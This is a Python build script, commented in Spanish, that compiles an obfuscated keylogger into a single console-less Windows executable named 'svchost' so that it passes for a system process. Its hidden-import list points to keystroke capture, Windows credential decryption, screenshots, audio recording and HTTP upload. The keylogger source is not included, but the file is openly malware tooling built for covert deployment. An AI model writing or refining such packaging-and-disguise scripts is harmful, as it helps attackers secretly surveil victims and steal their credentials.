"""
Compila keylogger.py (ofuscado) a un .exe con PyInstaller.
- Icono: icon.ico
- Salida: un solo archivo, sin consola
- Nombre genérico: "svchost" (editable abajo)
"""

import os
import sys
import shutil
import subprocess
from pathlib import Path

# ------------------ CONFIGURACIÓN ------------------
SCRIPT        = "keylogger_ofuscado.py"        # archivo a compilar
ICON          = "icon.ico"            # icono (debe existir)
OUTPUT_NAME   = "svchost"           # nombre genérico del .exe
HIDDEN_IMPORTS = [
    "pynput",
    "pynput.keyboard",
    "pynput._util",
    "pynput._util.win32",
    "win32gui",
    "win32crypt",
    "win32api",
    "winreg",
    "Crypto",
    "Crypto.Cipher",
    "Crypto.Cipher.AES",
    "cryptography",
    "cryptography.fernet",
    "sounddevice",
    "pyscreenshot",
    "requests",
    "PIL",
    "PIL.Image",
    "PIL.ImageGrab",
]
# ----------------------------------------------------


def check_requirements():
    """Verifica que existan los archivos necesarios."""
    base = Path(__file__).parent

    script_path = base / SCRIPT
    if not script_path.exists():
        print(f"[✗] No se encuentra {SCRIPT} en {base}")
        sys.exit(1)

    icon_path = base / ICON
    if not icon_path.exists():
        print(f"[!] No se encuentra {ICON}. Se compilará sin icono.")
        return None

    return str(icon_path)


def check_pyinstaller():
    """Comprueba que PyInstaller esté instalado."""
    try:
        import PyInstaller  # noqa: F401
    except ImportError:
        print("[✗] PyInstaller no está instalado. Instálalo con:")
        print("    pip install pyinstaller")
        sys.exit(1)


def clean_build():
    """Borra build/, dist/ y *.spec antiguos."""
    base = Path(__file__).parent
    for folder in ("build", "dist"):
        p = base / folder
        if p.exists():
            print(f"[*] Borrando {p}...")
            shutil.rmtree(p, ignore_errors=True)

    spec = base / f"{OUTPUT_NAME}.spec"
    if spec.exists():
        print(f"[*] Borrando {spec}...")
        spec.unlink()


def build(icon_path):
    """Ejecuta PyInstaller."""
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--noconsole",
        "--clean",
        "--noconfirm",
        "--name", OUTPUT_NAME,
    ]

    if icon_path:
        cmd += ["--icon", icon_path]

    # Imports ocultos (necesarios para pynput, crypto, etc.)
    for imp in HIDDEN_IMPORTS:
        cmd += ["--hidden-import", imp]

    # Datos extra opcionales (agrega aquí si necesitas archivos)
    # cmd += ["--add-data", "data;data"]

    cmd.append(SCRIPT)

    print("\n[*] Ejecutando:")
    print("    " + " ".join(cmd) + "\n")

    result = subprocess.run(cmd, cwd=Path(__file__).parent)
    if result.returncode != 0:
        print("\n[✗] PyInstaller falló.")
        sys.exit(result.returncode)


def show_result():
    base = Path(__file__).parent
    exe = base / "dist" / f"{OUTPUT_NAME}.exe"
    if exe.exists():
        size_mb = exe.stat().st_size / (1024 * 1024)
        print(f"\n✅ Compilado: {exe}")
        print(f"   Tamaño:   {size_mb:.1f} MB")
    else:
        print("\n[!] No se encontró el .exe en dist/")


if __name__ == "__main__":
    print("=" * 60)
    print("  Compilador de keylogger ofuscado")
    print("=" * 60)

    check_pyinstaller()
    icon_path = check_requirements()
    clean_build()
    build(icon_path)
    show_result()